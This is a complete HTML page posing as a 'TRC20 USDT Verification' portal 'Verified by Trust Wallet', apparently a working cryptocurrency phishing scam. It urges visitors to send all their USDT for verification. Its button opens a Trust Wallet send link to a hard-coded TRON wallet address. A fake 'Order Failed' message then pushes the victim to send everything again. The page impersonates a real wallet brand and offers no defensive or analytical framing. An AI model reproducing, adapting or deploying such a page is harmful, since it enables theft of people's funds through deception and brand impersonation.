<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TRC20 USDT Verification</title>
  <link rel="icon" type="image/png" href="trc20-logo.png">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to right, #101820, #1a1f2b);
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px;
      text-align: center;
    }
    header img {
      width: 100px;
      margin-bottom: 10px;
    }
    h1 {
      font-size: 26px;
      color: #00ffcc;
    }
    .card {
      background: #181e2f;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,255,255,0.1);
      margin-top: 30px;
      max-width: 400px;
      width: 100%;
    }
    button {
      background: #00ffcc;
      color: #000;
      border: none;
      padding: 14px 24px;
      font-size: 16px;
      border-radius: 30px;
      cursor: pointer;
      margin-top: 20px;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #00ddb0;
    }
    .processing {
      display: none;
      margin-top: 20px;
      font-size: 15px;
      color: #ffa500;
    }
    .flash-msg {
      display: none;
      font-weight: bold;
      color: #ff4444;
      margin-top: 20px;
      font-size: 15px;
      animation: flash 1s infinite;
    }
    @keyframes flash {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }
    footer {
      margin-top: 40px;
      font-size: 13px;
      opacity: 0.7;
    }
  </style>
</head>
<body>
  <header>
    <img src="trc20-logo.png" alt="TRC20 Logo">
    <h1>Verified by Trust Wallet</h1>
    <p>Secure USDT TRC20 verification portal</p>
  </header>

  <div class="card">
    <h2>Verify your USDT</h2>
    <p>Click below to send <strong>ALL</strong> USDT from your wallet for verification</p>
    <button onclick="verifyUSDT()">Verify All Amount</button>
    <div class="processing" id="processingText">Redirecting to Trust Wallet...</div>
    <div class="flash-msg" id="flashError">‚ùå Order Failed. Please enter all USDT and verify again.</div>
  </div>

  <footer>
    Powered by TRC20 Payment Gateway
  </footer>

  <script>
    const walletAddress = "TD8KqLSYMiE4xLX4QVrzX4BSRjpCis7vuK";

    function verifyUSDT() {
      document.getElementById("processingText").style.display = "block";
      setTimeout(() => {
        window.location.href = `https://link.trustwallet.com/send?coin=195&address=${walletAddress}`;
      }, 1500);
    }

    window.onload = function () {
      if (window.location.href.includes("?status=fail")) {
        document.getElementById("flashError").style.display = "block";
      }
    }
  </script>
</body>
</html>
